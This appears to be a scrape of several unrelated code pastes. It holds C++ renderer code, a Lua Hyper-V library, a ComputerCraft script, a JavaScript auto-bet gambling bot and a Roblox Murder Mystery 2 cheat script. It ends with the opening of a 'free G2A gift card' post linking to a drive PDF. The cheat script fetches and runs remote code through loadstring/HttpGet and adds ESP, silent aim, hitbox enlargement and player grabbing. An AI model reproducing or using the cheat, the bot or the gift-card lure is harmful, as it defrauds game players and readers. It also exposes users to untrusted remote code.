			mCamera.Write(mAppState->mScene->GetEntity(""Camera"")->GameObject().Get<Engine::CameraComponent>()->GetCamera());
			mCamera.Swap();
		});
	mRenderNode->AddInput(mResolveNode);
	if (mUseHardwareRaytracing)
	{
		mRenderNode->AddInput(mRaytraceHWNode);
	}
	else
	{
		mRenderNode->AddInput(mRaytraceNode);
	}

	// Add render nodes into pipeline
	if (mUseHardwareRaytracing)
	{
		mPipeline->AddNode(mRaytraceHWNode);
	}
	else
	{
		mPipeline->AddNode(mAccelerationNode);
		mPipeline->AddNode(mRaygenNode);
		mPipeline->AddNode(mRaytraceNode);
	}
	mPipeline->AddNode(mRenderNodesNode);
	mPipeline->AddNode(mMaterialNode);
	mPipeline->AddNode(mShadowRenderNode);
	mPipeline->AddNode(mCullingNode);
	mPipeline->AddNode(mDrawNode);
	mPipeline->AddNode(mReductionNode);
	mPipeline->AddNode(mResolveNode);
	mPipeline->AddNode(mRenderNode);

	mPipeline->Start();

	// Register events implemented on this class
	Engine::EventChannel chan(mEventSystem);
	chan.Add<Engine::Window::Resize>(*this);
	//chan.Add<Engine::Task::TaskCompleted>(*this);
}


/// <summary>
/// Default virtual destructor
/// </summary>
Renderer::~Renderer()
{
	if (mUseHardwareRaytracing)
	{
		delete mRaytraceHWNode;
	}
	else
	{
		delete mAccelerationNode;
		delete mRaygenNode;
		delete mRaytraceNode;
	}
	delete mRenderNodesNode;
	delete mMaterialNode;
	delete mShadowRenderNode;
	delete mCullingNode;
	delete mDrawNode;
	delete mReductionNode;
	delete mResolveNode;
	delete mRenderNode;

	delete mPipeline;
}

/// <summary>
/// Initialize system
/// </summary>
/// <returns>True on success, false otherwise</returns>
bool Renderer::Init()
{
	mImgui = new Engine::RenderPassImgui(mOptions, mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	ImGui::GetStyle().WindowBorderSize = 0;
	ImGui::GetIO().ConfigFlags |= ImGuiConfigFlags_DockingEnable;

	mGBufferPass = new Engine::GBuffer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mWireframePass = new Engine::RenderPassWireframe(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mTexturedPass = new Engine::RenderPassTextured(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	//mNativeResolvePass = new Engine::RenderPassResolveNative(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mMultisampling = new Engine::Multisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mResolve = new Engine::RenderPassResolveMultisample(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));
	mCulling = new Engine::Culling(mRenderer, mOptions->Get<int>(""Renderer.Culling.MaxBuffers""), mOptions->Get<int>(""Scene.MaxObjects""));
	mLightingSystem = new Engine::LightingSystem(mRenderer, mOptions->Get<int>(""Renderer.Lighting.MaxLights""), mOptions->Get<int>(""Renderer.Lighting.VirtualShadowMapResolution""), mCulling);
	mLightingPass = new Engine::LightingPass(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""), mLightingSystem);
	if (mUseHardwareRaytracing)
	{
		mRaytracerPassHW = new Engine::RenderPassRaytracerHW(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	}
	else
	{
		mRaytracerPass = new Engine::RenderPassRaytracer(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mAppState->mRaytracer);
	}
	mHiZPass = new Engine::RenderPassHiZ(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y);
	mAvgLuminance = new Engine::RenderPassAvgLuminance(mRenderer, mAppState->mWindowSize.x, mAppState->mWindowSize.y, mOptions->Get<int>(""Renderer.Antialiasing.SamplesMSAA""));

	mGizmoPass = new Engine::RenderGizmo(mRenderer, 1024);

	//mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature(), mLightingSystem->GetRootSignature(), mHiZPass->GetRootSignature() });
	mAppState->mRenderNodes = new Engine::RenderNodeList(mRenderer, mOptions->Get<int>(""Scene.MaxObjects""), std::vector<Engine::RootSignature*> { mTexturedPass->GetRootSignature() });

	mAppState->mEditorSettingsDialog = new Engine::EditorSettingsDialog(mLog, mOptions, mImgui, ""../Data/Config/ConfigModel.conf"");

	return true;
}

/// <summary>
/// Shutdown system
/// </summary>
void Renderer::Shutdown()
{
	mRenderer->Flush(); 

	delete mAppState->mEditorSettingsDialog;

	delete mImgui;
	delete mHiZPass;
	delete mGBufferPass;
	delete mWireframePass;
	delete mTexturedPass;
	//delete mNativeResolvePass;
	delete mMultisampling;
	delete mResolve;
	delete mLightingSystem;
	delete mCulling;
	delete mLightingPass;
	delete mRaytracerPass;
	delete mRaytracerPassHW;
	delete mAvgLuminance;
	delete mGizmoPass;
}

/// <summary>
/// Update call on system
/// </summary>
void Renderer::Update()
{
	mPipeline->Update();
}

/// <summary>
/// Window resize
/// </summary>
/// <param name=""r"">Window resize event parameter structure</param>
void Renderer::Handle(const Engine::Window::Resize& r)
{
	// Resize render pass objects bound to window size
	mImgui->Resize(r.mWidth, r.mHeight);
}"
0rup5Cwf,Lua Hyper-V (applied to OpenComputers),ASMProgrammer,Lua,Friday 5th of July 2024 03:48:03 PM CDT,"local hyper_v = {}
-- –û–ø—Ä–µ–¥–µ–ª–µ–Ω–∏–µ –∏–Ω—Ç–µ—Ä—Ñ–µ–π—Å–∞ –¥–ª—è –¥–∏—Å–∫–∞, –∫–æ—Ç–æ—Ä—ã–π –º–æ–∂–Ω–æ –ø–æ–¥–∫–ª—é—á–∏—Ç—å –∫ SCSI-–∫–æ–Ω—Ç—Ä–æ–ª–ª–µ—Ä—É
hyper_v.IScsiDrive = {}

-- Defines the current state of a virtual machine.
hyper_v.VirtualMachineState = {
    -- <summary>The state of the virtual machine could not be determined.</summary>
    Unknown = 0,
    -- <summary>The virtual machine is in an other state.</summary>
    Other = 1,
    -- <summary>The virtual machine is running.</summary>
    Running = 2,
    -- <summary>The virtual machine is turned off.</summary>
    Off = 3,
    -- <summary>The virtual machine is in the process of turning off.</summary>
    ShuttingDown = 4,
    -- <summary>The virtual machine does not support being started or turned off.</summary>
    NotApplicable = 5,
    -- <summary>The virtual machine might be completing commands, and it will drop any new requests.</summary>
    EnabledButOffline = 6,
    -- <summary>The virtual machine is in a test state.</summary>
    InTest = 7,
    -- <summary>The virtual machine might be completing commands, but it will queue any new requests.</summary>
    Deferred = 8,
    -- <summary>The virtual machine is running but in a restricted mode. The behavior of the virtual machine is similar to the Running state, but it processes only a restricted set of commands. All other requests are queued.</summary>
    Quiesce = 9,
    -- <summary>The virtual machine is in the process of starting. New requests are queued.</summary>
    Starting = 10
}

hyper_v.VirtualHardDrive = {}
hyper_v.VirtualHardDrive.__index = hyper_v.VirtualHardDrive

-- The file format of the virtual hard disk.
hyper_v.VirtualHardDiskFormat = {
    -- <summary>Generation 1 virtual hard disk format.</summary>
    Vhd = 2,
    -- <summary>Generation 2 virtual hard disk format.</summary>
    Vhdx = 3
}

-- Defines the type of virtual hard disk.
hyper_v.VirtualHardType = {
    -- <summary>Space for fixed virtual hard disks is first allocated when the file is created.</summary>
    FixedSize = 2,
    -- <summary>Space for dynamically expanding virtual hard disks is allocated on demand.</summary>
    DynamicallyExpanding = 3
    -- Differencing disks are not supported by this library.
    -- Differencing = 4
}

hyper_v.VirtualHardDisk = {}
hyper_v.VirtualHardDisk.__index = hyper_v.VirtualHardDisk

-- Define the ScsiController class
hyper_v.ScsiController = {}
hyper_v.ScsiController.__index = hyper_v.ScsiController
hyper_v.ScsiController.Drives = {}

-- Defines virtual DVD media
hyper_v.VirtualDvdDisk = {}
hyper_v.VirtualDvdDisk.__index = hyper_v.VirtualDvdDisk

-- Defines a virtual DVD drive
hyper_v.VirtualDvdDrive = {}
hyper_v.VirtualDvdDrive.__index = hyper_v.VirtualDvdDrive

hyper_v.WmiHelpers = {}

hyper_v.SecureBootTemplate = {}
hyper_v.SecureBootTemplate.RsOpenServer = ""{1734C6E8-3154-4DDA-BA5F-A874CC483422}""
hyper_v.SecureBootTemplate.RsUEFICertificateAuthority = ""{272E7447-90A4-4563-A4B9-8E4AB00526CE}""
hyper_v.SecureBootTemplate.OpenSourceShieldedVM = ""{4292AE2B-EE2C-42B5-A969-DD8F8689F6F3}""

-- Define the MacAddress class
hyper_v.MacAddress = {}
hyper_v.MacAddress.__index = hyper_v.MacAddress

-- Define the NetworkAdapter class
hyper_v.NetworkAdapter = {}
hyper_v.NetworkAdapter.__index = hyper_v.NetworkAdapter

-- Defines the automatic start action.
hyper_v.AutomaticStartAction = {
    -- Do not start automatically.
    Nothing = 2,
    -- Automatically start if the virtual machine was running when the service stopped.
    StartIfRunning = 3,
    -- Always start the virtual machine automatically.
    AlwaysStart = 4
}

-- Defines the automatic stop action.
hyper_v.AutomaticStopAction = {
    -- Save the virtual machine state.
    Save = 3,
    -- Turn off the virtual machine.
    TurnOff = 2,
    -- Shutdown the guest operating system.
    Shutdown = 4
} 

-- Defines the port mirroring mode for a network adapter.
hyper_v.PortMirroringMode = {
    -- The network adapter will not participate in mirroring.
    None = nil,

    -- The network adapter will accept mirrored data from source ports.
    Destination = nil,

    -- The network adapter will send mirrored data to detination ports.
    Source = nil
}

-- Defines the priority when balancing memory availability compared to other virtual machines.
hyper_v.MemoryWeight = {
    -- The lowest priority possible.
    Lowest = 0,

    -- The priority is lower than low.
    Lower = 1250,

    -- The priority is lower than balanced.
    Low = 2500,

    -- The priority is lower than balanced.
    BalancedLow = 3750,

    -- The priority is balanced.
    Balanced = 5000,

    -- The priority is higher than balanced.
    BalancedHigh = 6250,

    -- The priority is high.
    High = 7500,

    -- The priority is higher than high.
    Higher = 8750,

    -- The highest priority possible.
    Higest = 10000
}

function hyper_v.IScsiDrive.new()
  local obj = {}
  setmetatable(obj, hyper_v.IScsiDrive)
  hyper_v.IScsiDrive.__index = hyper_v.IScsiDrive
  return obj
end

-- Constructor function for MacAddress class
function hyper_v.MacAddress.new(mac)
    local self = setmetatable({}, hyper_v.MacAddress)
    self.mac = mac
    return self
end

-- Method to validate the MAC address format and check if it is a unicast MAC address
function hyper_v.MacAddress:validate()
    local pattern = ""^([0-9A-Fa-f][0-9A-Fa-f](-|%|:)){5}[0-9A-Fa-f][0-9A-Fa-f]$""
    if string.match(self.mac, pattern) then
        return true
    else
        return false
    end
end

-- Method to convert the MacAddress object to its string representation
function hyper_v.MacAddress:toString(lowercase)
    if lowercase then
        return string.lower(self.mac)
    else
        return self.mac
    end
end

-- Method to convert the MacAddress object to its string representation using a separator
function hyper_v.MacAddress:toStringWithSeparator(separator, lowercase)
    local formattedMac = string.gsub(self.mac, ""[-%:]"", separator)
    if lowercase then
        return string.lower(formattedMac)
    else
        return formattedMac
    end
end

-- Constructor function for NetworkAdapter class
function hyper_v.NetworkAdapter.new(virtualSwitch)
    local self = setmetatable({}, hyper_v.NetworkAdapter)
    self.IpsecOffloading = true
    self.IpsecSecurityAssociations = 512
    self.PortMirroringMode = ""None""
    self.ProtectedNetwork = true
    self.Vmq = true
    self.VirtualSwitch = virtualSwitch
    return self
end

-- Method to set VLAN ID for NetworkAdapter
function hyper_v.NetworkAdapter:setVlanId(value)
    if value < 1 or value > 4094 then
        error(""VlanId must be between 1 and 4094."")
    end
    self.Vlan = true
    self.vlanId = value
end

-- Method to set Maximum Bandwidth for NetworkAdapter
function hyper_v.NetworkAdapter:setMaximumBandwidth(value)
    if value > 999999999 then
        error(""MaximumBandwidth must be between 0 and 999999999."")
    end
    self.maximumBandwidth = value
end

-- Method to set Minimum Bandwidth for NetworkAdapter
function hyper_v.NetworkAdapter:setMinimumBandwidth(value)
    if value > 999999999 then
        error(""MinimumBandwidth must be between 0 and 999999999."")
    end
    self.minimumBandwidth = value
end

function hyper_v.ScsiController.new()
    local self = setmetatable({}, hyper_v.ScsiController)
    self.Drives = {}
    return self
end

function hyper_v.ScsiController:init()
    for i = 1, 64 do
        table.insert(self.Drives, i)
    end
end

function hyper_v.WmiHelpers.Dispose(array)
    for _, managementObject in ipairs(array) do
        managementObject:Dispose()
    end
end

function hyper_v.WmiHelpers.First(collection)
    for _, managementObject in ipairs(collection) do
        return managementObject
    end
    return nil
end

function hyper_v.WmiHelpers.ToObjectArray(managementStrings)
    local managementObjects = {}
    for index = 1, #managementStrings do
        managementObjects[index] = managementStrings[index]
    end
    return managementObjects
end

function hyper_v.VirtualDvdDrive:new()
    local self = setmetatable({}, hyper_v.VirtualDvdDrive)
    self.VirtualDvdDisk = nil
    return self
end

function hyper_v.VirtualDvdDrive:newWithDisk(virtualDvdDisk)
    local self = setmetatable({}, hyper_v.VirtualDvdDrive)
    self.VirtualDvdDisk = virtualDvdDisk
    return self
end

function hyper_v.VirtualDvdDisk:new(path)
    local self = setmetatable({}, hyper_v.VirtualDvdDisk)
    self.Path = path
    return self
end

function hyper_v.VirtualHardDisk:new()
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDisk)
    vhd.Format = nil
    vhd.Path = nil
    vhd.size = 0
    return vhd
end

function hyper_v.VirtualHardDisk:SetSize(value)
    if self.Format == ""Vhd"" then
        if value < 1 or value > 2040 then
            error(""Size must be between 1 and 2040."")
        end
    elseif self.Format == ""Vhdx"" then
        if value < 1 or value > 65536 then
            error(""Size must be between 1 and 65536."")
        end
    end
    self.size = value
end

function hyper_v.VirtualHardDrive:new()
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDrive)
    vhd.MaximumIOPS = 0
    vhd.MinimumIOPS = 0
    vhd.VirtualHardDisk = nil
    return vhd
end

function hyper_v.VirtualHardDrive:SetMaximumIOPS(value)
    if value < 0 or value > 1000000000 then
        error(""MaximumIOPS must be between 0 and 1000000000."")
    end
    self.MaximumIOPS = value
end

function hyper_v.VirtualHardDrive:SetMinimumIOPS(value)
    if value < 0 or value > 1000000000 then
        error(""MinimumIOPS must be between 0 and 1000000000."")
    end
    self.MinimumIOPS = value
end

function hyper_v.VirtualHardDrive:AttachVirtualHardDisk(virtualHardDisk)
    self.VirtualHardDisk = virtualHardDisk
end

function hyper_v.VirtualHardDrive:__call(virtualHardDisk, minimumIOPS, maximumIOPS)
    local vhd = {}
    setmetatable(vhd, hyper_v.VirtualHardDrive)
    vhd.VirtualHardDisk = virtualHardDisk
    vhd.MinimumIOPS = minimumIOPS
    vhd.MaximumIOPS = maximumIOPS
    return vhd
end

return hyper_v"
Y97Ain62,ReactorStorage,QuickMash,Lua,Friday 5th of July 2024 02:59:52 PM CDT,"local wired = peripheral.wrap(""back"")
local wireless = peripheral.wrap(""right"")
local mfsu_one = peripheral.wrap(""mfsu_4"")
local mfsu_two = peripheral.wrap(""mfsu_5"")

local euStoredTotal, capacityTotal
local relayID = 516

function OpenWireless()
	rednet.open(""right"")
	rednet.close(""back"")
end

function OpenWired()
	rednet.open(""back"")
	rednet.close(""right"")
end

function SendToRelay(msg)
	rednet.send(relayID, msg)
end

function MainLoop()
	while true do
		sleep(1)
		OpenWired()
		euStoredTotal = mfsu_one.getEUStored() + mfsu_two.getEUStored()
		capacityTotal = mfsu_one.getEUCapacity() + mfsu_two.getEUCapacity()
		OpenWireless()
		SendToRelay(""<eustored>"" .. euStoredTotal)
		SendToRelay(""<eucapacity>"" .. capacityTotal)
	end
end

MainLoop()"
qHEPgsNt,optimus crime snowybot2.0,coinwalk,JavaScript,Friday 5th of July 2024 02:37:35 PM CDT,"var nion = parseFloat(document.getElementById('pct_balance').value);
var smartz = parseFloat(document.getElementById('pct_balance').value);
var prefit = Number((nion/144).toPrecision(2));
var winnerdinner = parseFloat(document.getElementById('pct_balance').value);
var tens = (prefit*10);
var sevens = (prefit*6.99);
var eights = (prefit*7.99);
var james = parseFloat(document.getElementById('pct_balance').value);
var belance = parseFloat(document.getElementById('pct_balance').value);
var snowy = 0;
var beast = prefit;
var greedy =  parseFloat(document.getElementById('pct_balance').value);
var bolance = parseFloat(document.getElementById('pct_balance').value);
var golum = parseFloat(document.getElementById('pct_balance').value);
var snow = parseFloat(document.getElementById('pct_balance').value);



function go(){
bolance = parseFloat(document.getElementById('pct_balance').value);
if (bolance<snow){
belance = belance-beast;
snow = parseFloat(bolance);
}
if (bolance>snow){
belance = belance+beast;
snow = parseFloat(bolance);
}
if ((belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))&&(belance!=snowy)){
        beast = beast*2;
        snowy = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((nion)-beast)<=0)&&(belance>=(james+(nion)))&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
}
if ((((belance/2)-beast)<=0)&&(belance<=james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+eights))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance<(((Math.floor(belance/tens))*tens)+sevens))){
snowy = 0;
beast = prefit;
james = parseFloat(belance);
}
if ((((belance/4)-beast)<=0)&&(belance>james)&&(belance>(((Math.floor(belance/tens))*tens)+sevens))&&(belance<(((Math.floor(belance/tens))*tens)+eights))){
snowy = parseFloat(belance);
beast = prefit*2;
james = parseFloat(belance);
}
if (belance>=1000){
console.log(""winner winner chicken dinner"");
    return;
}
var cat = ((belance-smartz).toFixed(8));
console.log(""profit"");
console.log(cat);
$('#pct_chance').val(49.5);
$('#pct_bet').val(((beast*1).toFixed(8)));
$('#a_lo').click();
setTimeout(() => go(), 10);
}
go();
"
iSvY8PKB,Murder Mystery 2024 script,flappywierdo49,Lua,Friday 5th of July 2024 02:35:24 PM CDT,"local Library = loadstring(game:HttpGet(""https://raw.githubusercontent.com/xHeptc/Kavo-UI-Library/main/source.lua""))()
local Window = Library.CreateLib(""MM2 script by d3cryptt!"", ""Serpent"")

local startergui = game:GetService(""StarterGui"")


local players = game:GetService(""Players"")
local localPlayer = players.LocalPlayer
local teleportDistance = 2
local radius = 20

-- Main
local Main = Window:NewTab(""Main"")
local MainSection = Main:NewSection(""if you execute this script twice and it breaks, rejoin"")
local MainSection = Main:NewSection(""you can't turn the esp off btw"")

MainSection:NewButton(""Infinite Yield"", ""admin commands"", function()
loadstring(game:HttpGet(""https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source""))()
end)
-- Variables for hitbox size and transparency
local hitboxSize = 2
local hitboxTransparency = 0.5

MainSection:NewButton(""Murderer/Sherrif/Innocent ESP"", ""shows everyone on the map"", function()
    local espEnabled = true -- Global variable to control ESP

    local function hasItem(player, itemName)
        -- Check the backpack
        for _, item in ipairs(player.Backpack:GetChildren()) do
            if item.Name == itemName then
                return true
            end
        end

        -- Check the equipped items (character)
        for _, item in ipairs(player.Character:GetChildren()) do
            if item:IsA(""Tool"") and item.Name == itemName then
                return true
            end
        end

        return false
    end

    local function createESP(player, color)
        for _, part in ipairs(player.Character:GetChildren()) do
            if part:IsA(""BasePart"") then
                local esp = Instance.new(""BoxHandleAdornment"")
                esp.Name = ""ESP""
                esp.Adornee = part
                esp.Size = part.Size
                esp.Color3 = color
                esp.Transparency = 0.8
                esp.AlwaysOnTop = true
                esp.ZIndex = 10
                esp.Parent = part
            end
        end

        -- Create a BillboardGui for the player's name
        if player.Character:FindFirstChild(""Head"") then
            local head = player.Character.Head
            local billboard = Instance.new(""BillboardGui"")
            billboard.Name = ""PlayerNameESP""
            billboard.Adornee = head
            billboard.Size = UDim2.new(0, 120, 0, 35) -- Adjust this size as needed
            billboard.StudsOffset = Vector3.new(0, 2, 0)
            billboard.AlwaysOnTop = true
            billboard.Parent = head

            local textLabel = Instance.new(""TextLabel"")
            textLabel.Size = UDim2.new(1, 0, 1, 0)
            textLabel.BackgroundTransparency = 1
            textLabel.Text = player.Name
            textLabel.TextColor3 = color
            textLabel.TextScaled = true
            textLabel.Parent = billboard
        end
    end

    local function updateESP()
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player.Character then
                -- Remove old ESP
                for _, part in ipairs(player.Character:GetChildren()) do
                    if part:IsA(""BasePart"") and part:FindFirstChild(""ESP"") then
                        part.ESP:Destroy()
                    end
                    if part:IsA(""BasePart"") and part:FindFirstChild(""PlayerNameESP"") then
                        part.PlayerNameESP:Destroy()
                    end
                end

                -- Determine color
                local color
                if hasItem(player, ""Gun"") then
                    color = Color3.fromRGB(0, 0, 255) -- Blue for gun
                elseif hasItem(player, ""Knife"") then
                    color = Color3.fromRGB(255, 0, 0) -- Red for knife
                else
                    color = Color3.fromRGB(0, 255, 0) -- Green for none
                end

                -- Create new ESP
                createESP(player, color)
            end
        end
    end

    -- Initial ESP update
    updateESP()

    -- Update ESP periodically
    spawn(function()
        while true do
            if espEnabled then
                updateESP()
            else
                -- Clean up ESP when disabled
                for _, player in ipairs(game.Players:GetPlayers()) do
                    if player.Character then
                        for _, part in ipairs(player.Character:GetChildren()) do
                            if part:IsA(""BasePart"") and part:FindFirstChild(""ESP"") then
                                part.ESP:Destroy()
                            end
                            if part:IsA(""BasePart"") and part:FindFirstChild(""PlayerNameESP"") then
                                part.PlayerNameESP:Destroy()
                            end
                        end
                    end
                end
            end
            wait(0.1) -- Update every 0.1 seconds
        end
    end)
end)

-- Sliders for Hitbox Size and Transparency
MainSection:NewSlider(""Hitbox Size"", ""Adjust the hitbox size"", 40, 1, function(value)
    hitboxSize = value
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local hrp = player.Character.HumanoidRootPart
            hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
            hrp.Transparency = hitboxTransparency
            hrp.CanCollide = false
        end
    end
end)

MainSection:NewSlider(""Hitbox Transparency"", ""Adjust the hitbox transparency"", 10, 0, function(value)
    hitboxTransparency = value / 10
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local hrp = player.Character.HumanoidRootPart
            hrp.Transparency = hitboxTransparency
            hrp.Size = Vector3.new(hitboxSize, hitboxSize, hitboxSize)
            hrp.CanCollide = false
        end
    end
end)

-- WalkSpeed and JumpPower sliders
MainSection:NewSlider(""WalkSpeed"", ""Adjust the WalkSpeed"", 25, 16, function(value)
    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = value
end)

MainSection:NewSlider(""JumpPower"", ""Adjust the JumpPower"", 100, 50, function(value)
    game.Players.LocalPlayer.Character.Humanoid.JumpPower = value
end)

-- Sheriff/Innocent Section
local SheriffInnocent = Window:NewTab(""Sheriff/Innocent"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""Sheriff/Innocent"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""ONLY PRESS SILENT AIM ONCE"")
local SheriffInnocentSection = SheriffInnocent:NewSection(""make sure the murderer isnt behind a wall"")

SheriffInnocentSection:NewButton(""Teleport to the gun"", ""grab that gunn"", function()
    local player = game.Players.LocalPlayer.Character
    local part = workspace.Normal:FindFirstChild(""GunDrop"") 

    -- Save the player's original CFrame
    local originalCFrame = player.HumanoidRootPart.CFrame

    -- Teleport to the part
    if part then
        player.HumanoidRootPart.CFrame = part.CFrame
    end

    -- Wait for a short duration (e.g., 2 seconds) before teleporting back
    wait(0.3)

    -- Teleport back to the original CFrame
    player.HumanoidRootPart.CFrame = originalCFrame
end)


local function getNearestPlayer()
    local players = game.Players:GetPlayers()
    local localPlayer = game.Players.LocalPlayer
    local shortestDistance = math.huge
    local nearestPlayer = nil

    for _, player in ipairs(players) do
        if player ~= localPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
            local distance = (player.Character.HumanoidRootPart.Position - localPlayer.Character.HumanoidRootPart.Position).magnitude
            if distance < shortestDistance then
                shortestDistance = distance
                nearestPlayer = player
            end
        end
    end

    return nearestPlayer
end

local function silentAim()
    local player = game.Players.LocalPlayer
    local mouse = player:GetMouse()
    local UserInputService = game:GetService(""UserInputService"")
    local camera = workspace.CurrentCamera

    UserInputService.InputBegan:Connect(function(input, processed)
        if input.UserInputType == Enum.UserInputType.MouseButton1 and not processed then
            local nearestPlayer = getNearestPlayer()
            if nearestPlayer and nearestPlayer.Character and nearestPlayer.Character:FindFirstChild(""HumanoidRootPart"") then
                local head = nearestPlayer.Character:FindFirstChild(""Head"")
                if head then
                    mouse.Hit = head.CFrame
                    mouse.Target = head
                end
            end
        end
    end)
end

local silentAimEnabled = false

local function getNil(name, class)
    for _, v in next, getnilinstances() do
        if v.ClassName == class and v.Name == name then
            return v
        end
    end
end

local function invokeBeam(targetPosition)
    local args = {
        [1] = 1,
        [2] = targetPosition,
        [3] = ""AH2""
    }
    local player = game:GetService(""Players"").LocalPlayer
    local remoteFunction = player.Character:FindFirstChild(""Gun""):FindFirstChild(""KnifeLocal""):FindFirstChild(""CreateBeam""):FindFirstChild(""RemoteFunction"")
    
    if remoteFunction then
        remoteFunction:InvokeServer(unpack(args))
    end
end

local function getMurdererPosition()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if player.Backpack:FindFirstChild(""Knife"") or player.Character:FindFirstChild(""Knife"") then
            local character = player.Character
            if character and character:FindFirstChild(""HumanoidRootPart"") then
                return character.HumanoidRootPart.Position
            end
        end
    end
    return nil
end

local function silentAim()
    if silentAimEnabled then
        local targetPosition = getMurdererPosition()
        if targetPosition then
            invokeBeam(targetPosition)
        end
    end
end


SheriffInnocentSection:NewButton(""Shoot Murderer (silent aim)"", ""Enables or disables silent aim"", function()
    silentAimEnabled = not silentAimEnabled
end)

-- Run the silent aim function every 0.1 seconds
game:GetService(""RunService"").RenderStepped:Connect(function()
    silentAim()
end)




-- Murderer Section
local Murderer = Window:NewTab(""Murderer"")
local MurdererSection = Murderer:NewSection(""Murderer"")


    local function hasItem(player, itemName)
    -- Check the backpack
    for _, item in ipairs(player.Backpack:GetChildren()) do
        if item.Name == itemName then
            return true
        end
    end

    -- Check the equipped items (character)
    for _, item in ipairs(player.Character:GetChildren()) do
        if item:IsA(""Tool"") and item.Name == itemName then
            return true
        end
    end

    return false
end

local function teleportToPlayerWithGun()
    for _, player in ipairs(game.Players:GetPlayers()) do
        if hasItem(player, ""Gun"") then
            local localPlayer = game.Players.LocalPlayer
            if player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                localPlayer.Character.HumanoidRootPart.CFrame = player.Character.HumanoidRootPart.CFrame
            end
            break
        end
    end
end


MurdererSection:NewButton(""Teleport to Sheriff"", ""Teleports you to the player with the gun"", function()
    teleportToPlayerWithGun()
end)



-- Variables for the grab feature
local grabDistance = 20
local teleportDistance = 2
local keybind = Enum.KeyCode.E
local grabEnabled = false

-- Function to handle grabbing players
local function grabPlayers()
    while grabEnabled do
        for _, player in ipairs(game.Players:GetPlayers()) do
            if player ~= game.Players.LocalPlayer and player.Character and player.Character:FindFirstChild(""HumanoidRootPart"") then
                local distance = (game.Players.LocalPlayer.Character.HumanoidRootPart.Position - player.Character.HumanoidRootPart.Position).Magnitude
                if distance <= grabDistance then
                    local newCFrame = CFrame.new(game.Players.LocalPlayer.Character.HumanoidRootPart.Position + game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame.LookVector * teleportDistance)
                    player.Character:SetPrimaryPartCFrame(newCFrame)
                end
            end
        end
        wait(0.1)
    end
end


MurdererSection:NewKeybind(""Grab players"", ""Set the keybind for grab feature"", keybind, function()
    grabEnabled = not grabEnabled
    if grabEnabled then
        grabPlayers()
    end
end)

MurdererSection:NewSlider(""Grab Distance"", ""Adjust the distance to grab players"", 200, 1, function(value)
    grabDistance = value
end)

MurdererSection:NewSlider(""Teleport Distance"", ""Adjust the distance to teleport players in front of you"", 15, 1, function(value)
    teleportDistance = value
end)
"
fTn6mZJr,üéÅ G2A.COM FREE GIFT CARD GUIDE JULY 2024 V4üéÅ,wwxcwx,GetText,Friday 5th of July 2024 02:35:17 PM CDT,"G2A.com free gift card & games updated guide.
Any item for free on G2A.com including Amazon, Steam, Xbox, Playstation gift cards & everything else offered.

This is the most up to date version of this script. Any other one posted will not work
 
PDF guide here:
https://drive.google.com/file/d/1KMb0fLkKHIC2qdjR4vCSRH9rVSjJVMdX/view

Working as of:
